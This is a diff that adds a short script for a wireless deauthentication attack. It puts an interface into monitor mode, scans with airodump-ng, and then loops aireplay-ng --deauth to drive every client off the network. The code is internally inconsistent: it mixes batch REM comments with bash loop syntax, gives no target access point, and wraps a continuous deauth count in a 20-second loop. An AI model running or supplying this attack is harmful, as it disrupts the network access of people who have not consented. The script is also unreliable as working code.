@@ -1,0 +1,14 @@
+REM This script scans for hosts on a network and deauthenticates them from the network every 20 seconds.
+
+REM Set the interface to monitor mode
+airmon-ng start wlan0
+
+REM Scan for hosts on the network
+airodump-ng mon0
+
+REM Deauthenticate all hosts on the network
+while true
+do
+    aireplay-ng --deauth 0 mon0
+    sleep 20
+done
